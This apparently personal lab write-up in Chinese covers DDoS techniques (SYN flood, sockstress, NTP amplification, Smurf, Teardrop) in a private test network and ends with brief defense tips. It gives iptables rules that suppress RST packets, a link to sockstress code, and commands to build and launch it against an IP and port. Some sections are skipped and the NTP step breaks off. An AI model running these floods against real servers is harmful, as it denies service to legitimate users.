这两天玩了下传说中的拒绝服务，发现确实流氓：

前言

DDOS，全名为Distributed Denial of Service，意为分布式拒绝服务攻击，即利用各种资源和技术联合起来耗尽目标服务器带宽，使其无法处理正常请求来服务正常用户，从而实现敲诈勒索、报复、获取竞争优势的目的。
举一个例子可以很好的理解DDOS：街边开了一家奶茶店生意非常火爆，对门自己家的奶茶店无人问津，于是自己雇一些人早上一大早就去对门的奶茶店点一个奶茶，坐到晚上关门，使它无法服务真正的顾客，从而达到“抢生意”的目的。

实验环境：kali(192.168.1.106)、win2003(192.168.1.105)、win7（192.168.1.103）

开始实验：

①SYN洪水攻击
利用tcp三次握手的特性，对服务器发送syn请求，服务器回syn+ack后，不发送ack给服务器，从而导致tcp连接失败，当syn请求到达一定数量后，服务器将无法处理正常用户的syn请求。

先增加防火墙规则，不让攻击机发rst包断开tcp连接：
iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.103 -j DROP
iptables -L

②sockstress攻击
Sockstress也是一种基于tcp连接的拒绝服务攻击，与syn洪水攻击不同的是，它是一种慢速攻击。它通过将三次握手最后一个ack包的window size大小设为0，造成接收缓冲区已被填满的假象，维持tcp连接，当tcp连接数达到一定值时，服务器不在建立正常用户的tcp连接，从而达到拒绝服务攻击的目的。

攻击代码：https://github.com/defuse/sockstress
下载下来编译一下:

  • gcc -Wall -c sockstress.c
    – gcc -pthread -o sockstress sockstress.o
    – ./sockstress 1.1.1.1:80 eth0
    – ./sockstress 1.1.1.1:80 eth0 -p payloads/http

这种攻击也要增加防火墙规则：iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.105 -j DROP

⑤NTP放大攻击
NTP，全名 Network Time Protocol ，用来保证网络设备时间同步
利用客户端查询时，NTP服务器返回最后同步时间的600个客户端ip的特点发起dos攻击，放大倍数约为100倍。（服务器需要开启monlist查询功能）

查询是否开启monlist功能：

⑨一些已经过时的dos攻击：
Smurf攻击：通过使用将回复地址设置成受害网络的广播地址的ICMP应答请求(ping)数据包，来淹没受害主机，最终导致该网络的所有主机都对此ICMP应答请求做出答复，导致网络阻塞。
Teardrop攻击：向被攻击者发送多个分片的IP包，某些操作系统收到含有重叠偏移的伪造分片数据包时将会出现系统奔溃、重启等现象
主要针对早期操作系统（95，98，2.x的安卓、6.0的ios）

防御姿势

1.定期扫描，及时察觉异常
2.在骨干节点配置专业的抗拒绝服务设备
3.过滤不必要的服务和端口
